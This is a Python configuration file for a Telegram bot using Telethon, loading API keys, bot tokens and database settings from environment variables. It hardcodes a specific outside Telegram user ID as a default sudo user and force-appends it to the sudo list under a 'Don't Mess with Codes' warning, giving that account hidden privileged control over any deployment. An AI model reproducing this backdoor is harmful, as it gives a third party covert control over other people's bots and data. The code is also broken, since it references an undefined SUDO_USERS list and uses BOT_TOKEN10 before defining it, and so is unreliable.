
# --------------M----------------------------------

import os
from os import getenv
from telethon import TelegramClient
from decouple import config
import logging

 
# ---------------R---------------------------------
API_ID = int(os.environ.get("API_ID"))
# ------------------------------------------------
API_HASH = os.environ.get("API_HASH")
# ----------------D--------------------------------
BOT_TOKEN = os.environ.get("BOT_TOKEN")
# -----------------A-------------------------------
BOT_USERNAME = os.environ.get("BOT_USERNAME")
# ------------------X------------------------------
OWNER_ID = int(os.environ.get("OWNER_ID"))
# ------------------X------------------------------
DEEP_API = os.environ.get("DEEP_API")
# ------------------------------------------------
LOGGER_ID = int(os.environ.get("LOGGER_ID"))
# ------------------------------------------------
GPT_API = os.environ.get("GPT_API")
# ------------------------------------------------
DAXX_API = os.environ.get("DAXX_API")
# ------------------------------------------------
SUDO_USER = list(int(i) for i in os.environ.get("SUDO_USER", "6898413162").split(" "))
# ------------------------------------------------
MONGO_DB = os.environ.get("MONGO_DB")
# ------------------------------------------------
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
# ------------------------------------------------
SUDO_USERS.append(6898413162)
# ------------------------------------------------

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)

# ------------------------------------------------
# Tokens
SK10 = TelegramClient('MK', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
# ------------------------------------------------
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
# ------------------------------------------------
